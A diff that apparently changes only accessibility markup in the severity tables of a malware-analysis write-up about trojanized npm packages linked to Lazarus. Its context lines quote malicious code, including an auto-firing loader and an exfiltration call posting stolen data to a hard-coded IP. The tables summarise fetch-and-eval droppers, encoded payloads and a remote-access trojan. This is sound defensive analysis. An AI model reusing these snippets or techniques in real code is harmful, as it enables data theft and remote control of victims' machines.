@@ -35,14 +35,14 @@ The carrier is Joyent's original, untouched down to the copyright header. The gr
 (<span class="tok-kw">function</span> () { <span class="tok-fn">loadTokenData</span>(); })();   <span class="tok-com">// fires on require(); inert loadStringData() sibling left commented out</span>
 </code></pre>
 
-| | Trait | What it caught |
+| <span class="visually-hidden">Severity</span> | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/trojanized/library/remote-eval` | verbatim Joyent source carrying an IIFE that `eval`s a fetched body |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/delivery/fetch-eval` | fetch → decode → parse → eval, to a literal pastebin URL |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/encoded` | base64 string decoded and executed in the same file |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/impersonation/core-module` | a package calling itself the path module while shipping an `execp` dependency |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `well-known/malware/stealer/beaver-tail` | the bare `execp` dependency — the Nickel Alley tell |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/dependency/facade` | declared dependencies the code never loads |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/supply-chain/trojanized/library/remote-eval` | verbatim Joyent source carrying an IIFE that `eval`s a fetched body |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/command-and-control/dropper/delivery/fetch-eval` | fetch → decode → parse → eval, to a literal pastebin URL |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/anti-static/obfuscation/payload/encoded` | base64 string decoded and executed in the same file |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/supply-chain/impersonation/core-module` | a package calling itself the path module while shipping an `execp` dependency |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `well-known/malware/stealer/beaver-tail` | the bare `execp` dependency — the Nickel Alley tell |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/supply-chain/metadata-anomaly/dependency/facade` | declared dependencies the code never loads |
 
 ## Caught by shape, not the URL
 
@@ -80,13 +80,13 @@ sock.<span class="tok-fn">on</span>(<span class="tok-str">"start_ssh"</span>, op
 axios.<span class="tok-fn">post</span>(<span class="tok-str">"http://216.126.225.83/api/service/makelog"</span>, loot);   <span class="tok-com">// Lazarus exfil</span>
 </code></pre>
 
-| | Trait | What it caught |
+| <span class="visually-hidden">Severity</span> | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/payload/data-file` | the dropper: an obfuscated blob that launches a hidden Node child |
-| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/remote-command/control` | the RAT: `terminal-output`, `terminal-resize`, remote command execution |
-| <span class="sev-dot hostile" title="hostile"></span> | `well-known/malware/dropper/lazarus` | exfil to `/api/service/makelog` — the GlassWorm / Lazarus signature |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/install-hook/scripts/dynamic-install` | runtime install of `socket.io-client`, `sharp`, `screenshot-desktop` |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `micro-behaviors/communications/ip/literal` | hard-coded `216.126.225.83` C2 |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/anti-static/obfuscation/payload/data-file` | the dropper: an obfuscated blob that launches a hidden Node child |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `objectives/command-and-control/remote-command/control` | the RAT: `terminal-output`, `terminal-resize`, remote command execution |
+| <span class="sev-dot hostile" aria-hidden="true"></span>hostile | `well-known/malware/dropper/lazarus` | exfil to `/api/service/makelog` — the GlassWorm / Lazarus signature |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `objectives/supply-chain/install-hook/scripts/dynamic-install` | runtime install of `socket.io-client`, `sharp`, `screenshot-desktop` |
+| <span class="sev-dot suspicious" aria-hidden="true"></span>suspicious | `micro-behaviors/communications/ip/literal` | hard-coded `216.126.225.83` C2 |
 
 ## Attribution
 
